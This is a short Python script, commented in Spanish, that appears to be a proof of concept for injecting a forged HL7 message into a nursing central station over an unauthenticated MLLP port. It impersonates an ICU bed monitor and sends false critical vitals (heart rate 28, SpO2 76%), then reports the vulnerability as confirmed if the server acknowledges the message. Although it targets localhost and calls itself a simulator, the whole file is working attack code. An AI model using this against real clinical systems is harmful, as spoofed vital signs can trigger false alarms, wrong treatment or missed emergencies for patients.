import socket
from datetime import datetime

HOST = '127.0.0.1'
PORT = 2575

VT = b'\x0b'
FS_CR = b'\x1c\x0d'

def inyectar_trama_falsa():
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    # Trama HL7 suplantando al MONITOR_UCI de CAMA_04 con valores críticos falsos
    segmentos_falsos = [
        f"MSH|^~\\&|MONITOR_UCI|CAMA_04|CENTRAL|HOSPITAL|{timestamp}||ORU^R01|9999|P|2.5",
        "PID|1||ID0001^^^HOSPITAL^MR||PACIENTE^PRUEBA^CAMA04||19900101|M",
        "OBX|1|NM|8867-4^Frecuencia Cardiaca^LN||28|bpm|60-100|LL|||F",
        "OBX|2|NM|2708-6^Saturacion Oxigeno^LN||76|%|95-100|LL|||F"
    ]
    payload = VT + "\r".join(segmentos_falsos).encode('utf-8') + FS_CR

    print(f"[SIMULADOR DE INYECCIÓN] Conectando al puerto abierto {HOST}:{PORT}...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        print("[CONECTADO] El puerto 2575 no solicitó contraseña ni certificado.")
        print("[INYECTANDO] Enviando trama HL7 falsificada (FC: 28 bpm, SpO2: 76%)...")
        s.sendall(payload)
        
        respuesta = s.recv(1024).strip(VT + FS_CR).decode('utf-8', errors='replace')
        print("\n[RESPUESTA DE LA CENTRAL]:")
        for linea in respuesta.split('\r'):
            print(f"  {linea}")
        
        if "MSA|AA" in respuesta:
            print("\n[VULNERABILIDAD CONFIRMADA] La central aceptó los datos falsos (ACK: AA) sin autenticar el origen.")

if __name__ == "__main__":
    try:
        inyectar_trama_falsa()
    except ConnectionRefusedError:
        print("[ERROR] La central de enfermería no está activa en el puerto 2575.")
